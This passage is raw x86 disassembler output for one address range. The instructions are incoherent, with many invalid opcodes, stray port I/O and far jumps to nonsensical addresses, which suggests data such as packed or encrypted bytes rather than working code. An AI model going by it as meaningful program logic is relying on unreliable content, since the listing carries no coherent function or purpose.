  415ea3:	add    ecx,DWORD PTR [eax+eax*1+0x67]
  415ea7:	mov    ch,0x13
  415ea9:	retf   
  415eaa:	sti    
  415eab:	test   BYTE PTR [ebx-0x5e],ah
  415eae:	pop    edx
  415eaf:	cmp    cl,0x9
  415eb2:	outs   dx,BYTE PTR ds:[esi]
  415eb3:	in     al,0x67
  415eb5:	inc    esp
  415eb6:	pop    ebp
  415eb7:	in     al,0xa3
  415eb9:	iret   
  415eba:	xor    eax,0xd5369dc3
  415ebf:	inc    edi
  415ec0:	push   edi
  415ec1:	xlat   BYTE PTR ds:[ebx]
  415ec2:	mov    edi,0x6c71b577
  415ec7:	and    BYTE PTR [ebp-0x8b3ec77],ah
  415ecd:	out    dx,al
  415ece:	aam    0xa9
  415ed0:	cwde   
  415ed1:	or     BYTE PTR [edi-0x51],al
  415ed4:	jnp    0x415edb
  415ed6:	push   cs
  415ed7:	mov    esi,0x95d8364c
  415edc:	shl    BYTE PTR [eax-0x80],cl
  415edf:	(bad)  
  415ee0:	cmp    ecx,DWORD PTR [ebx+0x56]
  415ee3:	mov    ds:0x2e5e4b05,al
  415ee8:	idiv   BYTE PTR [ebx]
  415eea:	mov    ebx,ss
  415eec:	mov    esi,0xb85d3c83
  415ef1:	and    esi,edi
  415ef3:	and    al,0x4f
  415ef5:	inc    ecx
  415ef6:	adc    al,0x7d
  415ef8:	jnp    0x415f54
  415efa:	mov    ch,0xab
  415efc:	(bad)  
  415efd:	iret   
  415efe:	in     al,0x71
  415f00:	pop    edi
  415f01:	aad    0xe4
  415f03:	cs inc esi
  415f05:	(bad)  
  415f06:	adc    DWORD PTR [eax],ebx
  415f08:	mov    fs,WORD PTR [eax]
  415f0a:	(bad)  
  415f0b:	cmp    ebp,DWORD PTR [eax]
  415f0d:	mov    dh,BYTE PTR [ebx+0x31]
  415f10:	mov    ebx,0xd2f92ed7
  415f15:	repz int3 
  415f17:	inc    eax
  415f18:	pop    esp
  415f19:	test   al,0x98
  415f1b:	das    
  415f1c:	stos   BYTE PTR es:[edi],al
  415f1d:	dec    ebx
  415f1e:	fwait
  415f1f:	inc    edx
  415f20:	inc    edx
  415f21:	push   ds
  415f22:	(bad)  
  415f23:	aaa    
  415f24:	enter  0xd7a1,0xbc
  415f28:	test   eax,0xdc65a7db
  415f2d:	in     al,0x99
  415f2f:	sbb    eax,0x3cbbed83
  415f34:	pop    edi
  415f35:	adc    DWORD PTR [edx],ebx
  415f37:	cmc    
  415f38:	or     eax,0xd9fe33f0
  415f3d:	ss adc al,bl
  415f40:	rcl    DWORD PTR [ecx],cl
  415f42:	iret   
  415f43:	out    0x3,eax
  415f45:	push   esi
  415f46:	out    0xe4,eax
  415f48:	push   ds
  415f49:	inc    esi
  415f4a:	loop   0x415fb3
  415f4c:	or     al,0xc9
  415f4e:	sub    DWORD PTR ss:[edx-0x6a],eax
  415f52:	data16 or bh,ah
  415f55:	enter  0xb723,0x89
  415f59:	test   BYTE PTR [ebp+0x23],dh
  415f5c:	add    al,0xd3
  415f5e:	cmp    DWORD PTR gs:[ecx],esp
  415f61:	(bad)  
  415f63:	dec    ebx
  415f64:	js     0x415faf
  415f66:	inc    ebx
  415f67:	sbb    al,0xf2
  415f69:	or     eax,0xc2f43ecb
  415f6e:	or     edi,DWORD PTR [edx]
  415f70:	pop    ecx
  415f71:	rcr    DWORD PTR [ebx-0x5d],cl
  415f74:	mov    ch,0x43
  415f76:	ret    0xecbd
  415f79:	inc    esi
  415f7a:	imul   DWORD PTR ds:[esi+0x23]
  415f7e:	into   
  415f7f:	retf   
  415f80:	mov    dl,0xbd
  415f82:	rcl    BYTE PTR [edi],1
  415f84:	iret   
  415f85:	mov    esi,0xac88b00
  415f8a:	pop    esp
  415f8b:	(bad)  
  415f8c:	sar    ebp,cl
  415f8e:	in     eax,dx
  415f8f:	xor    bl,ch
  415f91:	shl    BYTE PTR [ebx+edx*4],cl
  415f94:	inc    edi
  415f95:	cwde   
  415f96:	fnsetpm(287 only) 
  415f98:	sub    BYTE PTR [edx+0x4a],bh
  415f9b:	test   eax,0x57994fe1
  415fa0:	cmc    
  415fa1:	in     eax,0xf9
  415fa3:	daa    
  415fa4:	xor    eax,DWORD PTR [ebx]
  415fa6:	sub    al,0xdd
  415fa8:	xor    ah,BYTE PTR [edx+0x9]
  415fab:	fsub   QWORD PTR [esp+eax*4]
  415fae:	sbb    DWORD PTR [ebx],0xcb2ea193
  415fb4:	pop    edi
  415fb5:	xchg   edi,eax
  415fb6:	xchg   edx,eax
  415fb7:	push   esp
  415fb8:	sub    al,0x61
  415fba:	repz jmp FWORD PTR [edx-0x3d1dae27]
  415fc1:	cmc    
  415fc2:	push   esp
  415fc3:	test   al,0x38
  415fc5:	mov    esp,0x9cd54e03
  415fca:	sbb    bl,BYTE PTR [edx-0x6e655605]
  415fd0:	(bad)  [ebx]
  415fd2:	xlat   BYTE PTR gs:[ebx]
  415fd4:	pop    ecx
  415fd5:	xorps  xmm7,XMMWORD PTR [edx+0x1f08bec0]
  415fdc:	sub    eax,0x75de71c8
  415fe1:	jmp    0xabb6055
  415fe6:	das    
  415fe7:	sub    ebx,DWORD PTR [ebx+0x40f8e79e]
  415fed:	jmp    0x415fd5
  415fef:	hlt    
  415ff0:	and    al,0x59
  415ff2:	inc    ebp
  415ff3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ff5:	into   
  415ff6:	xchg   BYTE PTR [ecx+0x23],bl
  415ff9:	ficomp WORD PTR [eax+0x384aec66]
  415fff:	loop   0x415fbb
  416001:	push   eax
  416002:	adc    al,0x29
  416004:	jno    0x415fba
  416006:	not    BYTE PTR [esp+edx*2-0x37]
  41600a:	popf   
  41600b:	dec    eax
  41600c:	add    al,0xb3
  41600e:	or     BYTE PTR [edi],bl
  416010:	fist   DWORD PTR ds:0x662eb12e
  416016:	or     DWORD PTR [eax-0x4d],0xea27013d
  41601d:	(bad)  
  41601e:	mov    ecx,0x847a2858
  416023:	mov    ds:0x99493166,eax
  416028:	xchg   BYTE PTR [eax],bl
  41602a:	(bad)  
  41602b:	out    0xa6,al
  41602d:	sub    al,0xf8
  41602f:	dec    eax
  416030:	scas   eax,DWORD PTR es:[edi]
  416031:	popa   
  416032:	fsubr  QWORD PTR [ebp-0x38c9a65d]
  416038:	xor    al,0xb7
  41603a:	es jge 0x41606e
  41603d:	or     BYTE PTR [edx+0x7223df8b],bh
  416043:	push   esi
  416044:	xor    BYTE PTR [eax+0x392b2150],dh
  41604a:	and    esi,0xedbce2b4
  416050:	setbe  dl
  416053:	inc    ecx
  416054:	mov    esp,0xc71719cf
  416059:	jns    0x416070
  41605b:	push   eax
  41605c:	jb     0x415ff4
  41605e:	cmp    cl,BYTE PTR [edx-0x60344c2b]
  416064:	sbb    cl,0x55
  416067:	scas   eax,DWORD PTR es:[edi]
  416068:	outs   dx,DWORD PTR ds:[esi]
  416069:	add    eax,DWORD PTR [edi+0x3141e906]
  41606f:	fstp   QWORD PTR [esi]
  416071:	test   BYTE PTR [ebx+ebp*4-0x5e],dl
  416075:	pop    DWORD PTR [edi]
  416077:	inc    esp
  416078:	add    esp,ebp
  41607a:	out    0x3e,al
  41607c:	retf   
  41607d:	(bad)  
  41607e:	push   0x36
  416080:	jne    0x41604e
  416082:	mov    cl,0xf7
  416084:	or     al,0x93
  416086:	dec    esp
  416087:	sub    al,0x55
  416089:	fs push cs
  41608b:	adc    edx,DWORD PTR [ebp-0x2107b2b9]
  416091:	jge    0x4160c9
  416093:	mov    esi,0x94222900
  416098:	fcmovbe st,st(2)
  41609a:	add    ah,dl
  41609c:	shl    BYTE PTR [ebp+0x42],1
  41609f:	and    bl,BYTE PTR es:[eax]
  4160a2:	ds jge 0x416029
  4160a5:	imul   esi,DWORD PTR [eax+0x10],0x3e
  4160a9:	inc    edi
  4160aa:	lods   al,BYTE PTR ds:[esi]
  4160ab:	mov    es,WORD PTR [esi-0x11]
  4160ae:	ret    0x71a4
  4160b1:	xchg   ebx,eax
  4160b2:	shr    al,1
  4160b4:	imul   DWORD PTR [esi]
  4160b6:	xchg   ebp,eax
  4160b7:	cmc    
  4160b8:	mov    al,0x35
  4160ba:	inc    ebx
  4160bb:	int3   
  4160bc:	add    eax,0x92e8e537
  4160c1:	out    dx,al
  4160c2:	jmp    0xbf16:0x720898d6
  4160c9:	xchg   edx,eax
  4160ca:	inc    ebp
  4160cb:	adc    ebx,DWORD PTR [ecx+edx*2+0x3079ee0c]
  4160d2:	adc    ebp,eax
  4160d4:	js     0x41613e
  4160d6:	sbb    eax,0xb7796eea
  4160db:	neg    DWORD PTR [ebx+ebx*1+0x27]
  4160df:	add    BYTE PTR ds:0xe65d61ff,dh
  4160e5:	clc    
  4160e6:	nop
  4160e7:	sbb    ecx,ebx
  4160e9:	ror    DWORD PTR [ebx-0x65bc8b67],0x4e
  4160f0:	xor    dh,cl
  4160f2:	sub    DWORD PTR [ebx-0x787cd1e7],0x45
  4160f9:	es das 
  4160fb:	ret    0xe87d
  4160fe:	cld    
  4160ff:	inc    ecx
  416100:	inc    esi
  416101:	xchg   esp,eax
  416102:	mov    bl,0xb1
  416104:	loopne 0x416127
  416106:	or     DWORD PTR [ebx],esi
  416108:	into   
  416109:	and    al,ah
  41610b:	popa   
  41610c:	pop    ebp
  41610d:	xchg   ebp,eax
  41610e:	stc    
  41610f:	sub    cl,bl
  416111:	xor    BYTE PTR [edx+0x1a],cl
  416114:	lds    esi,FWORD PTR [ebx+0xd]
  416117:	scas   al,BYTE PTR es:[edi]
  416118:	enter  0x1f30,0x10
  41611c:	add    eax,0x2b923346
  416121:	fnsave [ecx+edx*4-0x15e0b010]
  416128:	gs ins BYTE PTR es:[edi],dx
  41612a:	push   esi
  41612b:	push   esp
  41612c:	in     al,0x7
  41612e:	jecxz  0x4160ff
  416130:	fsubr  DWORD PTR [edx+0x3771929d]
  416136:	mov    edx,0x8d34253d
  41613b:	push   edx
  41613c:	cmp    al,0xac
  41613e:	das    
  41613f:	pop    es
  416140:	enter  0x895e,0xc3
  416144:	mov    bh,0x50
  416146:	xor    al,bh
  416148:	fbstp  TBYTE PTR [edx]
  41614a:	fld    QWORD PTR [edi]
  41614c:	mov    ah,0xc7
  41614e:	(bad)  
  41614f:	(bad)  
  416151:	add    BYTE PTR [ebx-0x1a],bh
  416154:	cmp    dh,BYTE PTR [eax+ebx*1]
  416157:	in     al,0x9b
  416159:	sub    eax,0xfeccfda0
  41615e:	pop    es
  41615f:	mov    ebx,0x34d6330f
  416164:	retf   
  416165:	jae    0x416106
  416167:	jns    0x4161d9
  416169:	mov    edi,0x59f4227f
  41616e:	iret   
  41616f:	(bad)  
  416170:	mov    eax,0xd92b1ff6
  416175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416176:	and    BYTE PTR [ecx+0x5b888b4],0xe4
  41617d:	fwait
  41617e:	jle    0x41618c
  416180:	ja     0x416111
  416182:	or     dh,BYTE PTR [eax-0x42c410b0]
  416188:	sbb    al,0x99
  41618a:	xchg   edx,eax
  41618b:	lahf   
  41618c:	jge    0x41618e
  41618e:	pusha  
  41618f:	js     0x416150
  416191:	cmp    DWORD PTR [edx-0x7167c925],0x5c
  416198:	jp     0x416182
  41619a:	hlt    
  41619b:	adc    eax,0x769de2b9
  4161a0:	mov    ebp,0x8ae1992e
  4161a5:	ret    0x8849
  4161a8:	lea    ebp,[esi+0x231ea37a]
  4161ae:	inc    ebx
  4161af:	mov    ebx,0x3aceb226
  4161b4:	push   cs
  4161b5:	sub    edi,ecx
  4161b7:	fistp  DWORD PTR [edi]
  4161b9:	sub    BYTE PTR ds:0xbf8a369d,dh
  4161bf:	inc    esp
  4161c0:	jg     0x41620a
  4161c2:	dec    esi
  4161c3:	fdivr  DWORD PTR [esi-0x44]
  4161c6:	push   edx
  4161c7:	in     al,dx
  4161c8:	call   0x15edba6b
  4161cd:	mov    bh,0x26
  4161cf:	xchg   ecx,eax
  4161d0:	das    
  4161d1:	or     eax,0x9dbba1e8
  4161d6:	lds    ecx,FWORD PTR [edx]
  4161d8:	xor    DWORD PTR [ebx+0x29],0x68d4c512
  4161df:	xchg   DWORD PTR [ebx],edi
  4161e1:	or     eax,0x114de776
  4161e6:	sub    DWORD PTR [esi+0x4e],edx
  4161e9:	mov    esp,0x1cd06ee7
  4161ee:	push   cs
  4161ef:	pop    ecx
  4161f0:	lea    esi,[edi-0x5516765e]
  4161f6:	mov    DWORD PTR [edx],esp
  4161f8:	stos   DWORD PTR es:[edi],eax
  4161f9:	fstp   DWORD PTR [esi+edi*8]
  4161fc:	dec    ebp
  4161fd:	xor    BYTE PTR [ebx],bl
  4161ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416200:	les    ecx,FWORD PTR [ebp-0x12]
  416203:	push   0x72ce6b1d
  416208:	mov    bl,BYTE PTR cs:[edi-0x74]
  41620c:	jecxz  0x4161eb
  41620e:	jg     0x4161cf
  416210:	and    eax,0xb574ea08
  416215:	ss js  0x41621f
  416218:	imul   edi,DWORD PTR [ebx],0x349e80ca
  41621e:	clc    
  41621f:	loope  0x416271
  416221:	xchg   esp,eax
  416222:	hlt    
  416223:	out    dx,eax
  416224:	add    ebx,DWORD PTR [ecx+0x3bfa52cc]
  41622a:	fisub  WORD PTR [edi+0x5e36cb16]
  416230:	scas   al,BYTE PTR es:[edi]
  416231:	std    
  416232:	jbe    0x41620c
  416234:	adc    al,0xd4
  416236:	cdq    
  416237:	test   bl,bl
  416239:	jns    0x4161f1
  41623b:	or     eax,0x42214dbf
  416240:	sti    
  416241:	mov    ah,BYTE PTR [ebp-0x2bf281ff]
  416247:	fcmovb st,st(3)
  416249:	dec    eax
  41624a:	jmp    0x416297
  41624c:	or     DWORD PTR [edx+0x46810233],ebp
  416252:	add    eax,0x1b59dcd3
  416257:	xchg   bl,cl
  416259:	pop    esi
  41625a:	xor    dl,ch
  41625c:	adc    al,0x16
  41625e:	leave  
  41625f:	push   es
  416260:	adc    al,0x97
  416262:	fs retf 0x699f
  416266:	lock stos BYTE PTR es:[edi],al
  416268:	add    eax,0x8c231806
  41626d:	shl    dh,cl
  41626f:	cwde   
  416270:	jecxz  0x416291
  416272:	repnz out dx,eax
  416274:	push   cx
  416276:	inc    ebx
  416277:	push   edi
  416278:	sar    BYTE PTR [edi],0x82
  41627b:	mov    DWORD PTR [edx],edx
  41627d:	int3   
  41627e:	jmp    0x6ed5:0x2a9ac5ae
  416285:	sti    
  416286:	stos   DWORD PTR es:[edi],eax
  416287:	mov    dh,0x95
  416289:	dec    esp
  41628a:	dec    edi
  41628b:	push   esp
  41628c:	adc    ebp,esi
  41628e:	adc    ebp,edx
  416290:	(bad)  
  416291:	push   eax
  416292:	and    al,0xe1
  416294:	jae    0x4162ed
  416296:	and    eax,0x6beff1d9
  41629b:	xchg   ebp,eax
  41629c:	imul   esi,DWORD PTR [ebx],0xffffffad
  41629f:	imul   edx,DWORD PTR [edx],0xd1d3213a
  4162a5:	and    DWORD PTR [edi+0x735a074c],eax
  4162ab:	pop    eax
  4162ac:	test   al,0xeb
  4162ae:	inc    eax
  4162af:	pop    edx
  4162b0:	lea    edi,[ecx-0x29c9cd5e]
  4162b6:	iret   
  4162b7:	xor    al,0x5a
  4162b9:	push   ss
  4162ba:	jnp    0x4162b5
  4162bc:	cli    
  4162bd:	(bad)  
  4162be:	mov    eax,ds:0x64e39795
  4162c3:	out    0xd2,eax
  4162c5:	pop    ebx
  4162c6:	sbb    ebp,DWORD PTR [eax-0x2b8913b4]
  4162cc:	(bad)
  4162cf:	and    cl,0x7e
  4162d2:	lds    esi,FWORD PTR [eax-0x66]
  4162d5:	mov    bl,0xe7
  4162d7:	or     edx,DWORD PTR [esp-0x67e85df5]
  4162de:	push   cs
  4162df:	xlat   BYTE PTR ds:[ebx]
  4162e0:	lock aas 
  4162e2:	pop    es
  4162e3:	test   cl,dh
  4162e5:	jno    0x4162ac
  4162e7:	or     eax,0x66ede00f
  4162ec:	mov    ?,WORD PTR [esi-0xf]
  4162ef:	fwait
  4162f0:	arpl   WORD PTR [edx-0x74],ax
  4162f3:	jecxz  0x416360
  4162f5:	sub    al,0xe5
  4162f7:	call   0x43f5e3d8
  4162fc:	jne    0x416328
  4162fe:	cld    
  4162ff:	xor    ah,BYTE PTR [edx+0x27159719]
  416305:	in     eax,dx
  416306:	push   ds
  416307:	ret    0x79fa
  41630a:	push   ds
  41630b:	mov    bh,BYTE PTR [esi-0x21827a36]
  416311:	outs   dx,BYTE PTR ds:[esi]
  416312:	icebp  
  416313:	retf   0xd7f7
  416316:	inc    ebp
  416317:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416318:	aas    
  416319:	shl    BYTE PTR [eax],1
  41631b:	mov    esp,0xaa56fa47
  416320:	bound  eax,QWORD PTR [eax]
  416322:	jbe    0x416379
  416324:	out    0x9,eax
  416326:	adc    DWORD PTR [bx],ecx
  416329:	mov    eax,0x5ad4f770
  41632e:	jnp    0x41638e
  416330:	pop    ss
  416331:	cmp    BYTE PTR [esi-0x76920d9d],0x86
  416338:	push   esp
  416339:	stos   BYTE PTR es:[edi],al
  41633a:	push   ebx
  41633b:	das    
  41633c:	pop    ss
  41633d:	repnz or al,0x8
  416340:	ret    0x3525
  416343:	jne    0x4163ac
  416345:	jge    0x41638a
  416347:	repnz mov ah,0xf2
  41634a:	and    BYTE PTR [ecx-0x51],bl
  41634d:	stos   BYTE PTR es:[edi],al
  41634e:	div    BYTE PTR [edx-0x36922657]
  416354:	and    al,BYTE PTR [ebx-0x6ce9beba]
  41635a:	mov    esp,0x7037ac07
  41635f:	mov    bl,0xe7
  416361:	sbb    DWORD PTR [eax],esp
  416363:	sbb    al,0xf5
  416365:	into   
  416366:	jne    0x4163de
  416368:	mov    ds:0xb661926b,al
  41636d:	pusha  
  41636e:	pusha  
  41636f:	or     DWORD PTR [ebx],edx
  416371:	stos   BYTE PTR es:[edi],al
  416372:	adc    BYTE PTR [esi+eiz*2-0x688e2fc5],bl
  416379:	add    eax,0x30fea1a1
  41637e:	dec    ebx
  41637f:	jg     0x4163e9
  416381:	adc    al,0x75
  416383:	aas    
  416384:	add    DWORD PTR [edi+0x44],0x6e
  416388:	data16 jo 0x416347
  41638b:	xor    al,dh
  41638d:	ret    
  41638e:	cmc    
  41638f:	in     al,dx
  416390:	pusha  
  416391:	pop    edx
  416392:	adc    al,0xf5
  416394:	out    dx,eax
  416395:	ficom  WORD PTR [eax+edi*4]
  416398:	push   ss
  416399:	xchg   esi,eax
  41639a:	pop    esi
  41639b:	mov    ch,0x17
  41639d:	mov    eax,0x373bd66e
  4163a2:	es pop ebx
  4163a4:	pop    edi
  4163a5:	sbb    DWORD PTR [ecx-0x63],esp
  4163a8:	xor    al,BYTE PTR [ebp-0x3c8013a3]
  4163ae:	jmp    0x9f800997
  4163b3:	dec    edi
  4163b4:	add    BYTE PTR [esi*2+0x6e046907],cl
  4163bb:	xchg   al,bh
  4163bd:	ret    
  4163be:	inc    eax
  4163bf:	fsubr  DWORD PTR [edi-0x80]
  4163c2:	retf   0x4c0c
  4163c5:	rol    DWORD PTR [esi-0xe],0x8e
  4163c9:	cs test eax,0xc8ec8eae
  4163cf:	inc    eax
  4163d0:	add    ebp,ebx
  4163d2:	aam    0x1b
  4163d4:	lahf   
  4163d5:	sub    ecx,DWORD PTR [edx]
  4163d7:	or     BYTE PTR [esi],ah
  4163d9:	aam    0xad
  4163db:	jmp    0x409203ba
  4163e0:	lahf   
  4163e1:	and    ebp,edx
  4163e3:	cmp    eax,DWORD PTR [edi]
  4163e5:	dec    ebx
  4163e6:	pusha  
  4163e7:	jae    0x416378
  4163e9:	sahf   
  4163ea:	jge    0x416436
  4163ec:	push   eax
  4163ed:	or     BYTE PTR [ebx+edx*8-0x38f8bbe1],dh
  4163f4:	addr16 mov al,0x5e
  4163f7:	fild   WORD PTR ds:0x394941a3
  4163fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163fe:	jne    0x416435
  416400:	xor    dh,bl
  416402:	pop    esp
  416403:	sub    BYTE PTR [ecx+ebp*4+0x3f],0xca
  416408:	inc    ebx
  416409:	or     esp,0xc183126f
  41640f:	daa    
  416410:	pop    edi
  416411:	pushf  
  416412:	test   BYTE PTR ds:0x51bb9cd4,dl
  416418:	push   ebx
  416419:	ss and esi,ecx
  41641c:	xchg   edx,eax
  41641d:	pop    esi
  41641e:	jg     0x416412
  416420:	mov    esp,0x9120c4
  416425:	mov    edx,0x858b3fab
  41642a:	and    BYTE PTR [eax-0x50],dl
  41642d:	push   edx
  41642e:	adc    bh,BYTE PTR [edx+0x3a39d58b]
  416434:	dec    esp
  416435:	(bad)  
  416436:	in     al,dx
  416437:	es push ds
  416439:	dec    edi
  41643a:	fisub  WORD PTR [edi-0x4a]
  41643d:	in     eax,0x58
  41643f:	outs   dx,DWORD PTR ds:[esi]
  416440:	out    dx,al
  416441:	dec    edx
  416442:	iret   
  416443:	cmp    ecx,DWORD PTR [esi+0x3581eb60]
  416449:	jg     0x4164c9
  41644b:	fistp  DWORD PTR [esi+0x259afc9b]
  416451:	inc    edx
  416452:	pop    es
  416453:	shl    DWORD PTR [edi+eiz*8+0x698afb25],cl
  41645a:	stc    
  41645b:	mov    edi,0x933c4182
  416460:	pop    ebx
  416461:	add    eax,DWORD PTR [eax-0x991fb1a]
  416467:	jae    0x4164cd
  416469:	xchg   ebx,eax
  41646a:	and    eax,0x879874bb
  41646f:	sbb    BYTE PTR [ebp+eiz*2-0x3535117],ch
  416476:	adc    eax,0xee2d5ee8
  41647b:	ds jl  0x416418
  41647e:	or     DWORD PTR [ebx+0x6dc05753],esi
  416484:	adc    eax,0xa8edeb6d
  416489:	inc    ebx
  41648a:	scas   al,BYTE PTR es:[edi]
  41648b:	xchg   BYTE PTR [esi-0x4a2d209c],bl
  416491:	mov    ah,0x55
  416493:	xchg   edx,eax
  416494:	add    eax,0xa76a7872
  416499:	mov    edi,0xc500a85f
  41649e:	mov    ds:0xca3c1aba,eax
  4164a3:	xor    bh,0xac
  4164a6:	(bad)  
  4164a7:	adc    BYTE PTR [ebp-0x27ab0a49],bl
  4164ad:	mov    esi,0xf0aafc3a
  4164b2:	mov    BYTE PTR [ecx-0x2ac7978a],bh
  4164b8:	and    DWORD PTR [ebx-0x21],0x71
  4164bc:	aas    
  4164bd:	jne    0x416475
  4164bf:	lods   eax,DWORD PTR ds:[esi]
  4164c0:	js     0x4164ce
  4164c2:	pop    ebx
  4164c3:	push   ebp
  4164c4:	xor    al,BYTE PTR [edi-0x80]
  4164c7:	nop
  4164c8:	addr16 push edi
  4164ca:	sub    ch,BYTE PTR [ebp+eax*8-0x36]
  4164ce:	mov    ds:0x25cb4053,eax
  4164d3:	sub    BYTE PTR [ebp-0x59e8bbc0],cl
  4164d9:	les    edx,FWORD PTR [ebx+0x2e782448]
  4164df:	xor    eax,0x515ebba1
  4164e4:	lahf   
  4164e5:	test   al,0xa6
  4164e7:	pop    ecx
  4164e8:	les    esi,FWORD PTR [eax-0x6f6120cf]
  4164ee:	imul   ebx,DWORD PTR [esi+0x43041465],0x53
  4164f5:	fild   WORD PTR [ebx+0x11]
  4164f8:	idiv   al
  4164fa:	retf   0x4447
  4164fd:	xlat   BYTE PTR ds:[ebx]
  4164fe:	into   
  4164ff:	int    0x1b
  416501:	add    DWORD PTR [ecx+0x220a5139],edi
  416507:	xchg   ecx,eax
  416508:	hlt    
  416509:	addr16 (bad) 
  41650c:	and    eax,0x5173422c
  416511:	mov    cl,0xd
  416513:	adc    eax,DWORD PTR [edx+0x583873a1]
  416519:	ficomp DWORD PTR [ebx-0x75]
  41651c:	stos   BYTE PTR es:[edi],al
  41651d:	inc    ebp
  41651e:	call   FWORD PTR [ecx+0x68997223]
  416524:	push   esp
  416525:	mov    ds:0xe7e51328,eax
  41652a:	sbb    esi,DWORD PTR [ecx+0x3b]
  41652d:	adc    al,0xb7
  41652f:	lods   eax,DWORD PTR ds:[esi]
  416530:	xlat   BYTE PTR ds:[ebx]
  416531:	out    dx,eax
  416532:	or     eax,0xf9a0cd07
  416537:	(bad)  
  416539:	mov    dh,0xfe
  41653b:	out    0x3b,al
  41653d:	test   BYTE PTR [edi],0x91
  416540:	daa    
  416541:	int3   
  416542:	fild   WORD PTR [eax]
  416544:	iret   
  416545:	sahf   
  416546:	inc    ebp
  416547:	shl    eax,1
  416549:	test   al,0x7f
  41654b:	dec    ecx
  41654c:	xchg   BYTE PTR ds:0x225065b7,dl
  416552:	push   ebx
  416553:	les    esp,FWORD PTR [edx-0x6]
  416556:	cmp    DWORD PTR [esi+0x306007d5],edx
  41655c:	repnz test eax,0xf46ca19e
  416562:	aam    0x2a
  416564:	mov    ebp,0xb2f77f30
  416569:	popa   
  41656a:	loope  0x4165a3
  41656c:	mov    edi,0xaafdb72c
  416571:	(bad)  
  416573:	sar    DWORD PTR [edi-0x69d7aa25],cl
  416579:	pop    ecx
  41657a:	xor    DWORD PTR [edi-0x45],0x13
  41657e:	aaa    
  41657f:	xor    esp,esi
  416581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416582:	pop    es
  416583:	mov    esi,0x429f72da
  416588:	cmp    edi,DWORD PTR [edi-0x1d8c6f7e]
  41658e:	stos   DWORD PTR es:[edi],eax
  41658f:	cmc    
  416590:	push   eax
  416591:	push   ss
  416592:	sti    
  416593:	push   ebp
  416594:	mov    edx,0x602a5c09
  416599:	(bad)  [ecx+0x44]
  41659c:	sub    ecx,edx
  41659e:	sub    al,0x96
  4165a0:	iret   
  4165a1:	in     al,dx
  4165a2:	mov    ch,0xe7
  4165a4:	cwde   
  4165a5:	and    ecx,DWORD PTR [ecx+0x41968cf6]
  4165ab:	inc    ecx
  4165ac:	loopne 0x4165d0
  4165ae:	inc    ecx
  4165af:	inc    ebx
  4165b0:	pop    edx
  4165b1:	aas    
  4165b2:	les    esi,FWORD PTR [eax]
  4165b4:	or     eax,0x3f00c3b5
  4165b9:	retf   
  4165ba:	or     bh,bl
  4165bc:	in     al,dx
  4165bd:	inc    eax
  4165be:	in     al,dx
  4165bf:	jne    0x4165e5
  4165c1:	mov    al,ds:0x34b7cfd3
  4165c6:	xlat   BYTE PTR ds:[ebx]
  4165c7:	aaa    
  4165c8:	jmp    0x433b:0x2da4e29b
  4165cf:	test   BYTE PTR [ecx],bl
  4165d1:	jp     0x4165b3
  4165d3:	push   eax
  4165d4:	sbb    BYTE PTR [edi-0x58],ah
  4165d7:	and    dh,0xd9
  4165da:	sbb    eax,0xe6a29e60
  4165df:	jmp    0xb8a2f159
  4165e4:	ins    DWORD PTR es:[edi],dx
  4165e5:	or     al,0x7c
  4165e7:	sar    DWORD PTR [ebx-0x7e],1
  4165ea:	fwait
  4165eb:	into   
  4165ec:	test   al,0xd4
  4165ee:	jg     0x41664a
  4165f0:	cmc    
  4165f1:	(bad)  
  4165f2:	or     eax,0x9e4cf850
  4165f7:	fbld   TBYTE PTR [ecx]
  4165f9:	hlt    
  4165fa:	imul   ebp,DWORD PTR [esi],0x7f
  4165fd:	push   es
  4165fe:	xchg   ebx,eax
  4165ff:	pop    edi
  416600:	scas   al,BYTE PTR es:[edi]
  416601:	(bad)  [eax-0x3b]
  416604:	in     al,dx
  416605:	cdq    
  416606:	xlat   BYTE PTR ds:[ebx]
  416607:	jno    0x4165a8
  416609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41660a:	pop    edi
  41660b:	add    al,0xd4
  41660d:	arpl   WORD PTR [esi+0x60],si
  416610:	into   
  416611:	mov    edx,0x7fb8ecb0
  416616:	ins    DWORD PTR es:[edi],dx
  416617:	jbe    0x416638
  416619:	pop    ebp
  41661a:	inc    edx
  41661b:	push   0xdc81a5d1
  416620:	adc    DWORD PTR [ebx],ecx
  416622:	pop    edx
  416623:	call   0x32947d8c
  416628:	xlat   BYTE PTR ds:[ebx]
  416629:	data16 fild WORD PTR [ebp-0x5bd959ed]
  416630:	jbe    0x4165db
  416632:	xchg   edi,eax
  416633:	pop    ecx
  416634:	xor    edx,DWORD PTR [ecx+0x46a813b0]
  41663a:	idiv   DWORD PTR [ecx+ebx*2-0x57]
  41663e:	push   eax
  41663f:	pop    esp
  416640:	jne    0x41664a
  416642:	mov    WORD PTR [esi-0x49],ss
  416645:	adc    dl,BYTE PTR ds:0x10d304ce
  41664b:	jb     0x416674
  41664d:	stc    
  41664e:	sub    edx,DWORD PTR ds:[esi]
  416651:	cmp    al,0x40
  416653:	mov    dl,BYTE PTR [ebx+0x29]
  416656:	pop    esp
  416657:	in     al,dx
  416658:	addr16 push 0x41
  41665b:	mov    ecx,0x21c274c6
  416660:	pop    ebx
  416661:	mov    ss,WORD PTR [ebx]
  416663:	push   esp
  416664:	retf   0xa0fb
  416667:	fst    QWORD PTR [ecx+0x233c06c0]
  41666d:	or     eax,0xc4ada7d6
  416672:	xrelease xchg DWORD PTR [edx-0xe],edx
  416676:	xchg   esp,eax
  416677:	sbb    eax,0xc74e0320
  41667c:	xchg   ecx,eax
  41667d:	lods   eax,DWORD PTR ds:[esi]
  41667e:	push   edi
  41667f:	outs   dx,BYTE PTR ds:[esi]
  416680:	add    DWORD PTR [eax],esi
  416682:	pop    ebx
  416683:	cmp    ch,BYTE PTR [edi-0x1fede43c]
  416689:	lds    ebp,FWORD PTR [edi+ebp*4-0x791d401c]
  416690:	xor    eax,0x68cbb793
  416695:	jne    0x4166c7
  416697:	call   FWORD PTR [edx-0x51]
  41669a:	retf   
  41669b:	sub    DWORD PTR [edx+0x2e],0x9a995f7d
  4166a2:	push   edx
  4166a3:	repz dec ebp
